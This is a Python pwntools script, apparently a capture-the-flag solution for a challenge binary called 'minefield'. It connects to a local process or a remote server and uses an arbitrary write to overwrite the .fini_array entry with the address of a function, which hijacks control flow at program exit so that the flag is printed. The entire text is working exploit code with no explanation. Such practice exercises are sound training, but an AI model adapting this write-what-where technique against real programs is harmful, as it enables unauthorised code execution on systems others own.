#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./minefield')

if args.REMOTE:
	p = remote('206.189.121.131',32732)
else:
	p = process(binary.path)

p.sendlineafter('> ','2')
p.sendlineafter('mine: ',hex(binary.get_section_by_name('.fini_array').header.sh_addr))
p.sendlineafter('plant: ',hex(binary.sym._))
print(p.recvuntil('}').decode())
